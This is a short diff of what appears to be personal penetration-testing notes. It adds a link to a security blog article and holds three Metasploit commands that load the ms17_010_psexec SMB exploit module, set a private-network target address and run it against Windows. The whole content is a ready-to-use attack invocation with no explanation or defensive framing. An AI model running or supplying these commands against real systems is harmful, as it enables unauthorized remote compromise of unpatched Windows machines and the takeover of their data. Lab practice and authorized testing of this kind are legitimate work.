@@ -1,3 +1,4 @@
+https://cn-sec.com/archives/1606430.html
 use exploit/windows/smb/ms17_010_psexec 
 set rhost 192.168.55.154
 run
